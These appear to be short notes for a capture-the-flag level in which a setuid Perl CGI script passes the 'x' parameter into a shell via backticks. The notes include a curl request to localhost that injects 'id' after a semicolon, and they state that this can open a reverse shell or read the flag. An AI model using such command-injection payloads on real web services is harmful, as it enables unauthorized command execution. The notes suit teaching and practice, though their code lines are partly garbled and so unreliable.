#!/bin/bash

#flag
#token ne2searoevaevoem4ov4ar8ap
ls -la
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl

cat level04.pl

CGI reader content.
Acess with curl and pass the params
curl "http://localhost:4747/level04.pl?x=hello%3Bid"

vulnerable code
/bin/sh -c "echo <USER_INPUT> 2>&1"

print `echo $y 2>&1`; + x(param("x"));

You can pass any command in the x parameter and it will be executed. 
Can open a reverse shell or just read the flag file.